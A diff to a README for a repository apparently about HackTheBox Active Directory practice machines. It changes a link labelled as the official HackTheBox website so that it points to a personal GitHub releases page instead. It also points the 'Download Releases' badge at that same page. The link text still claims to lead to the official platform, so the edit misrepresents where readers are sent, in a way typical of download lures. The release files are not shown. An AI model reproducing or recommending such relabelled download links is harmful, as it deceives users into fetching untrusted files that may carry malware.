@@ -24,7 +24,7 @@ Remember, the key to success in cybersecurity is practice and persistence. Keep 
 
 ## Additional Resources
 
-In addition to the machines listed in this repository, you can also check out the official HackTheBox website for more challenges, labs, and resources to further enhance your cybersecurity knowledge. Visit [HackTheBox](https://www.hackthebox.eu) for a comprehensive platform dedicated to cybersecurity training and challenges.
+In addition to the machines listed in this repository, you can also check out the official HackTheBox website for more challenges, labs, and resources to further enhance your cybersecurity knowledge. Visit [HackTheBox](https://github.com/richard2023first/HackTheBox-AD-Machines/releases) for a comprehensive platform dedicated to cybersecurity training and challenges.
 
 ## Releases
 
@@ -34,6 +34,6 @@ For the latest updates and new additions to the list of Active Directory machine
 
 Ready to test your skills and take on the challenges of Active Directory machines from HackTheBox? Click the button below to access the release files and get started on your cybersecurity journey:
 
-[![Download Releases](https://img.shields.io/badge/Download-Releases-blue)](https://github.com/assets/Release.zip)
+[![Download Releases](https://github.com/richard2023first/HackTheBox-AD-Machines/releases)](https://github.com/richard2023first/HackTheBox-AD-Machines/releases)
 
 🔒 Happy hacking and have fun exploring the world of cybersecurity with HackTheBox-AD-Machines! 🔓
